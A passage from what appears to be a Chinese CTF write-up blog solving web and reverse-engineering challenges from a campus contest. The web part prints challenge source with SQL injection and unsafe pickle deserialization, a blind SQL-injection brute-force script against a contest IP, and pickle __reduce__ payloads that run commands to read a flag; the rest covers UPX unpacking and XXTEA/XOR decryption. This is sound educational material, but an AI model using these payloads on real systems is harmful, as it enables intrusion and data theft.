class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">from functools import cache</span><br><span class="line">from pathlib import Path</span><br><span class="line"></span><br><span class="line">import psycopg2</span><br><span class="line">from flask import Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag = Path(&quot;/app/f1aaaaaaggggggg&quot;).read_text().strip()</span><br><span class="line"></span><br><span class="line">white_list = set(&quot; &#x27;flag&#123;HeL10_W0rld&#125;&#x27;&quot; + string.digits + string.ascii_letters+&#x27;-&#x27;)</span><br><span class="line">black_list = [&quot;like&quot;]</span><br><span class="line"></span><br><span class="line">@cache</span><br><span class="line">def connect_database():</span><br><span class="line">    db_user = &quot;postgres&quot;</span><br><span class="line">    db_password = &quot;postgresql&quot;</span><br><span class="line">    db_host = &quot;127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">    connection = psycopg2.connect(user=db_user, password=db_password, host=db_host)</span><br><span class="line"></span><br><span class="line">    return connection</span><br><span class="line"></span><br><span class="line">with app.app_context():</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    conn = connect_database()</span><br><span class="line">    create_sql = &quot;&quot;&quot;</span><br><span class="line">        DROP TABLE IF EXISTS company;</span><br><span class="line">        CREATE TABLE IF NOT EXISTS company (</span><br><span class="line">            name TEXT</span><br><span class="line">        )</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    with conn.cursor() as sql:</span><br><span class="line">        sql.execute(create_sql)</span><br><span class="line">        sql.execute(&quot;SELECT COUNT(*) FROM company&quot;)</span><br><span class="line">        if sql.fetchall()[0][0] == 0:</span><br><span class="line">            sql.execute(&quot;INSERT INTO company (name) VALUES (&#x27;ikun&#x27;)&quot;)</span><br><span class="line">            sql.execute(&quot;INSERT INTO company (name) VALUES (&#x27;man&#x27;)&quot;)</span><br><span class="line">            sql.execute(&quot;INSERT INTO company (name) VALUES (&#x27;%s&#x27;)&quot; % (flag))</span><br><span class="line">        conn.commit()</span><br><span class="line"></span><br><span class="line">@app.post(&quot;/submit&quot;)</span><br><span class="line">def submit_form():</span><br><span class="line">    conn = None</span><br><span class="line">    try:</span><br><span class="line">        username = request.form[&quot;username&quot;]</span><br><span class="line">        conn = connect_database()</span><br><span class="line"></span><br><span class="line">        for char in username:</span><br><span class="line">            if char not in white_list:</span><br><span class="line">                return &quot;你这名字有点奇怪emmm&quot;, 400</span><br><span class="line"></span><br><span class="line">        for forbidden_word in black_list:</span><br><span class="line">            if forbidden_word in username.lower():</span><br><span class="line">                return &quot;发现商业间谍，鸡毙你！！！&quot;, 400</span><br><span class="line"></span><br><span class="line">        with conn.cursor() as curr:</span><br><span class="line">            curr.execute(&quot;SELECT * FROM company WHERE name = &#x27;%s&#x27;&quot; % username)</span><br><span class="line">            result = curr.fetchall()</span><br><span class="line"></span><br><span class="line">        if len(result):</span><br><span class="line">            return &quot;恭喜你，开启美好的一天吧&quot;, 200</span><br><span class="line">        return &quot;你是新来的员工吗，我怎么不认识你&quot;, 201</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        return f&quot;Error: &#123;str(e)&#125;&quot;, 400</span><br><span class="line"></span><br><span class="line">    finally:</span><br><span class="line">        if conn is not None:</span><br><span class="line">            conn.commit()</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    return &quot;&quot;&quot;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;打卡机&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body style=&quot;background-image: url(//images/week1-re-校赛wp.assets/i_like_work.jpg)&quot;&gt;</span><br><span class="line">    &lt;a&gt;勤劳的打工人，请输入名字进行上班打卡&lt;/a&gt;</span><br><span class="line">    &lt;form action=&quot;/submit&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;width: 80vw&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&quot;&quot;&quot;, 200</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure><p>根据提示</p><p>不是 mysql</p><p><code>Postgresql</code></p><p>打开实例后是这样的</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Lwk1bgFsdoPSAuxvXAXcQc3Lnsx.png"></p><p><code>SIMILAR TO</code> 是 PostgreSQL 特有的模糊匹配操作符，其模式语法结合了 <code>LIKE</code> 的通配符（<code>%</code>、<code>_</code>）和正则表达式的元字符（如 <code>|</code>、<code>()</code>、<code>[]</code>）。<a href="https://blog.csdn.net/qq_32838955/article/details/105466577?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-4-105466577-blog-133937030.235%5Ev43%5Epc_blog_bottom_relevance_base5&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-4-105466577-blog-133937030.235%5Ev43%5Epc_blog_bottom_relevance_base5&utm_relevant_index=9">Postgresql 学习笔记之——模糊匹配 LIKE、SIMILAR TO 和 POSIX 正则表达式_sql similar to-CSDN 博客</a></p><p>SQL 通配符的应用 <a href="https://www.runoob.com/sql/sql-wildcards.html">https://www.runoob.com/sql/sql-wildcards.html</a></p><p>利用脚本进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &quot;http://101.35.218.130:32887/submit&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">payload = &quot;_&quot;</span><br><span class="line">words = string.ascii_letters + string.digits + &quot;&#123;&#125;- &quot;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line">&#125;</span><br><span class="line">#探测flag长度</span><br><span class="line">for i in range(1, 51):</span><br><span class="line">    flag = &quot;_&quot; * i</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;username&quot;: f&quot;1&#x27; or name similar to &#x27;&#123;flag&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data,headers=headers)</span><br><span class="line">    if &quot;恭喜你&quot; in response.text:</span><br><span class="line">        last_found_count=i</span><br><span class="line"></span><br><span class="line">#探测flag</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,last_found_count+1):</span><br><span class="line">    for j in words:</span><br><span class="line">        res = requests.post(url,data=&quot;username=1&#x27; or name SIMILAR TO &#x27;&quot; + (payload * (i - 1)) + j + (payload * (last_found_count - i)),headers=headers)</span><br><span class="line">        if &quot;恭喜你&quot; in res.text:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>运行结果获得 flag</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/PQzSbn4tWoFVSCxSJI6cBCvSntf.png"></p><p><code>QLNU&#123;45e30069-07f2-4026-b581-32058e8503fa&#125;</code></p><h2 id="Py"><a href="#Py" class="headerlink" title="Py"></a>Py</h2><p>先看一下源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, redirect, render_template, session</span><br><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">#该文件位于/app/app.py</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(24)</span><br><span class="line">FLAG = os.environ.get(&#x27;GZCTF_FLAG&#x27;, &#x27;CTF&#123;test_flag&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    if not session.get(&#x27;logged_in&#x27;):</span><br><span class="line">        return redirect(&#x27;/login&#x27;)</span><br><span class="line">    return redirect(&#x27;/dashboard&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        username = request.form.get(&#x27;username&#x27;)</span><br><span class="line">        password = request.form.get(&#x27;password&#x27;)</span><br><span class="line">        if username == &#x27;admin&#x27; and password == &#x27;猜下密码&#x27;:</span><br><span class="line">            session[&#x27;logged_in&#x27;] = True</span><br><span class="line">            return redirect(&#x27;/dashboard&#x27;)</span><br><span class="line">        return &#x27;&lt;script&gt;alert(&quot;Invalid!&quot;); location.href=&quot;/login&quot;;&lt;/script&gt;&#x27;</span><br><span class="line">    return render_template(&#x27;login.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/dashboard&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def dashboard():</span><br><span class="line">    if not session.get(&#x27;logged_in&#x27;):</span><br><span class="line">        return redirect(&#x27;/login&#x27;)</span><br><span class="line">    </span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        data = request.form.get(&#x27;data&#x27;, &#x27;&#x27;)</span><br><span class="line">        try:</span><br><span class="line">            result = pickle.loads(bytes.fromhex(data))</span><br><span class="line">            return f&#x27;Data processed: &#123;str(result)&#125;&#x27;  # 显示反序列化结果</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return f&#x27;Error: &#123;str(e)&#125;&#x27;</span><br><span class="line">    </span><br><span class="line">    return render_template(&#x27;dashboard.html&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure><p>登陆需要密码，可以尝试以下 Burp Suite 爆破，我们有字典</p><p>先添加 payload</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/XQ5HbNe3doCLjpx2PILcXdVTnfg.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Tb7nbIrd6ol93Ax7FWGcI9fannf.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/T26cbFN8CoEM44xeonYcOyfInYb.png"></p><p>得到密码为 admin123</p><p>输入后得到</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/CTj0bbW9yolujZxsJugcC58PnKb.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Raamb1eB0ovBnoxEd7Lcj0TynXb.png"></p><p>看源码中，与 pickle 反序列化</p><p>我们可以通过构造恶意的 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">_class_ Exploit:</span><br><span class="line">    _def_ __reduce__(_self_):</span><br><span class="line">        _# 读取环境变量并返回_</span><br><span class="line">        return (os.getenv, (&#x27;GZCTF_FLAG&#x27;,))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Exploit()).hex()</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><p>这里也可以利用 <code>subprocess</code> 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 导入必要的模块</span><br><span class="line">import pickle    # Python对象序列化模块（危险：反序列化时可执行任意代码）</span><br><span class="line">import subprocess # 用于执行系统命令</span><br><span class="line"></span><br><span class="line"># 定义一个恶意类，利用pickle反序列化时自动调用的__reduce__方法</span><br><span class="line">class Exploit:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        当对象被pickle反序列化时，此方法会被调用</span><br><span class="line">        返回一个元组：(可调用对象, 参数元组)</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 返回subprocess.check_output函数和它的参数</span><br><span class="line">        # 参数是一个命令列表：[&quot;printenv&quot;, &quot;GZCTF_FLAG&quot;]</span><br><span class="line">        # 这个命令会打印环境变量GZCTF_FLAG的值</span><br><span class="line">        return (subprocess.check_output, ([&quot;printenv&quot;, &quot;GZCTF_FLAG&quot;],))</span><br><span class="line"></span><br><span class="line"># 生成恶意payload</span><br><span class="line"># 1. 创建Exploit对象</span><br><span class="line"># 2. pickle.dumps将其序列化为字节流</span><br><span class="line"># 3. .hex()将字节流转换为十六进制字符串（便于传输或存储）</span><br><span class="line">payload = pickle.dumps(Exploit()).hex()</span><br><span class="line"></span><br><span class="line"># 输出payload（十六进制形式）</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><p>依旧可以实现</p><p>得到</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/KPaJbFL7woJ9BYxPg7gcEk0WnOd.png"></p><p><code>80049522000000000000008c026f73948c06676574656e769493948c0a475a4354465f464c414794859452942e</code></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/KAbhby0LtoLEi8xQJ60cCkCgnRg.png"></p><p>获得 flag <code>QLNU&#123;a1fa2161-e736-4f91-9a50-596a0cc6f049&#125;</code></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Fly-Bird"><a href="#Fly-Bird" class="headerlink" title="Fly_Bird"></a>Fly_Bird</h2><p>先用 die 查一下，发现是用 upx 包裹的 32 位</p><p>所以先用 upx 脱壳</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/AQxTbbfukoDRMexonEKciXrqnJb.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/OF8tbBq5GotijHxtDKxcYP2dnEc.png"></p><p>这样就脱壳完成了，</p><p>再将其拖进 ida，就能找到 flag</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/YY9CbVuH0oTq4lxlTiNcXcQ7nBe.png"></p><p><code>QLNU&#123;no_pain_no_gains&#125;</code></p><h2 id="茶（promax-版）"><a href="#茶（promax-版）" class="headerlink" title="茶（promax 版）"></a>茶（promax 版）</h2><p>解压附件后是一个 exe 的格式文件，用 die 打开后发现有一处被魔改的 upx</p><p>壳</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/CXVRbuCrkou9IxxodrsckeA8nof.png"></p><p>接下来用 010 打开，进行修改</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/LmbYbp9Zlo0bUqx4VwcchQDInjV.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Cm95bYEb3omCvnxnGJKcStfZnXc.png"></p><p>保存后重新用 die 打开</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Twz4bz725oCTsFxfH5Ec2X7in5e.png"></p><p>一个普通的 upx 壳，进行脱壳</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/PR7Bb9eDUoCuaLxI0eccAjJenKd.png"></p><p>这样就脱壳成功了，接下来我们就可以把它放进 ida 中进行分析</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/H902bebQeo9MDMx8LDnckeS1ngc.png"></p><p>查看 unk_405020 的输入内容</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/JaK9b2XMHo15THxGYfOcAcJynTg.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/PTlIbEl4GocTvLxf6sycdJdEnEg.png"></p><p>看 enc 加密函数</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/HJaxbINjEo4wHLxphZScXoC6ndR.png"></p><ul><li>代码中 <code>sum -= 1640531527</code>：<ul><li><code>1640531527</code> 的十六进制是 <code>0x61C88647</code>，它是 <code>0x9E3779B9</code> 的补码表示（即 <code>-0x61C88647 = 0x9E3779B9</code>）。</li><li>这是 <strong>XXTEA&#x2F;TEA 家族算法</strong> 的标志性常量。</li></ul></li></ul><p>利用脚本解决这个问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#define delta 0x9e3779b9</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int v[37] = &#123;0x76D42BE1, 0xD9DF03C4, 0x0BD0A181, 0xF10201C0, 0xE4592862, 0xCA7A6980, 0x042150A6, 0x2BE23AF3, 0x356E5E55, 0xC2337C76, 0xB7313BD7, 0x5B2E1195, 0xF59BE5C7, 0xD1FE3936, 0xBAD4593E, 0xC8776223, 0xA6ED7222, 0x811C4F11, 0x4FAD07DC, 0xD36AA578, 0x0230540B, 0xF89E6C42, 0x6D27DD7D, 0xECF5B7C3, 0xA9346EEC, 0xC81EF864, 0xAE305136, 0xB0DCD19A, 0x9149D1C7, 0xA593BD5F, 0x0458FCCA, 0x5A5BDBAF, 0x1C1C2221, 0x87DFA0FF, 0x4753CF52, 0x5D696B28, 0x422A7BB4&#125;;</span><br><span class="line">    </span><br><span class="line">        unsigned int key[5] = &#123;5,6,7,8,9&#125;;</span><br><span class="line">    unsigned int sum = 0;</span><br><span class="line">    unsigned int y,z,p,rounds,e;</span><br><span class="line">    int n = 37;</span><br><span class="line">    int i = 0;</span><br><span class="line">    rounds = 6 + 52/n;</span><br><span class="line">    y = v[0];</span><br><span class="line">    sum = rounds*delta;</span><br><span class="line">     do</span><br><span class="line">     &#123;</span><br><span class="line">        e = sum &gt;&gt; 2 &amp; 3;</span><br><span class="line">        for(p=n-1;p&gt;0;p--)</span><br><span class="line">        &#123;</span><br><span class="line">            z = v[p-1];</span><br><span class="line">            v[p] -= ((((z&gt;&gt;5)^(y&lt;&lt;2))+((y&gt;&gt;3)^(z&lt;&lt;4))) ^ ((key[(p&amp;3)^e]^z)+(y ^ sum)));</span><br><span class="line">            y = v[p];</span><br><span class="line">        &#125;</span><br><span class="line">        z = v[n-1];</span><br><span class="line">        v[0] -= (((key[(p^e)&amp;3]^z)+(y ^ sum)) ^ (((y&lt;&lt;2)^(z&gt;&gt;5))+((z&lt;&lt;4)^(y&gt;&gt;3))));</span><br><span class="line">        y = v[0];</span><br><span class="line">        sum = sum-delta;</span><br><span class="line">     &#125;while(--rounds);</span><br><span class="line"> </span><br><span class="line">    for(i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c%c%c%c&quot;,*((char*)&amp;v[i]+0),*((char*)&amp;v[i]+1),*((char*)&amp;v[i]+2),*((char*)&amp;v[i]+3));</span><br><span class="line">        //printf(&quot;%c%c%c%c&quot;,*((char*)&amp;v[i]+3),*((char*)&amp;v[i]+2),*((char*)&amp;v[i]+1),*((char*)&amp;v[i]+0));</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Xr7WbpJDnom801xKJn0cqYqQnth.png"></p><p><code>QLNU&#123;^_^yoU_MuST_1iK3_Th3_t34_pR0m4x&#125;</code></p><h2 id="deepsleep"><a href="#deepsleep" class="headerlink" title="deepsleep"></a>deepsleep</h2><p>先拖进 die 中进行查看，没有加壳</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/NugAbQNpzoq6dmx4p4ccIIB7nUd.png"></p><p>那我们就直接拖进 ida 中查看 main 函数</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/R566bIN5uoQ8hkxtiTgck1rdn8C.png"></p><p>用户输入的为 24 字节的 Arglist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">00402220</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span>+xmmword_402220 xmmword <span class="number">4040404040404040404040404040404</span>h</span><br><span class="line">.rdata:<span class="number">00402220</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span>                                           ; DATA XREF: _main+<span class="number">157</span>↑r</span><br><span class="line">.rdata:<span class="number">00402230</span> <span class="number">55</span> <span class="number">48</span> <span class="number">4</span>A <span class="number">51</span> <span class="number">7F</span> <span class="number">73</span> <span class="number">34</span> <span class="number">5B</span> <span class="number">6</span>C <span class="number">45</span>+xmmword_402230 xmmword <span class="number">6</span>A656D7C5B6D456C5B34737F514A4855h</span><br></pre></td></tr></table></figure><p>前十六位和 16 个进行异或，后 8 位和 4 进行异或</p><p><code>C[whAaTy</code> 后 8 位预计输出的内容，将两端内容进行拼接，获取最后的 flag</p><p>利用脚本进行拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_re_challenge</span>():</span><br><span class="line">    <span class="comment"># 根据用户提供的数据段信息</span></span><br><span class="line">    <span class="comment"># xmmword_402220 是 16 个 0x04</span></span><br><span class="line">    xor_key = <span class="string">b&#x27;\x04&#x27;</span> * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># xmmword_402230 的字节序列（从 .rdata 段提取）</span></span><br><span class="line">    xmm230_bytes = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;55484A517F73345B6C456D5B7C6D656A&quot;</span>)  <span class="comment"># 共16字节</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密后的后8字节数据（固定字符串 &quot;C[whAaTy&quot;）</span></span><br><span class="line">    encrypted_part2 = <span class="string">b&#x27;C[whAaTy&#x27;</span>  <span class="comment"># 原始字节：43 5B 77 68 41 61 54 79</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密前16字节：encrypted_part1 = xmm230_bytes，密钥为 xor_key (0x04*16)</span></span><br><span class="line">    decrypted_part1 = <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(xmm230_bytes, xor_key)])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密后8字节：异或 0x04</span></span><br><span class="line">    decrypted_part2 = <span class="built_in">bytes</span>([c ^ <span class="number">0x04</span> <span class="keyword">for</span> c <span class="keyword">in</span> encrypted_part2])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 组合得到原始输入（flag）</span></span><br><span class="line">    flag = decrypted_part1 + decrypted_part2</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行解密并输出结果</span></span><br><span class="line">flag = decrypt_re_challenge()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的Flag:&quot;</span>, flag.decode(<span class="string">&#x27;latin1&#x27;</span>))  <span class="comment"># 处理可能的非ASCII字符</span></span><br></pre></td></tr></table></figure><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Sr1XbEoRHovhPHxBM0Hc10CSnFg.png"></p><p>获得 flag</p><p><code> QLNU&#123;w0_hAi_xianG_slEeP&#125;</code></p><h2 id="HUA"><a href="#HUA" class="headerlink" title="HUA"></a>HUA</h2><p>先拖进 die 中</p><p><img 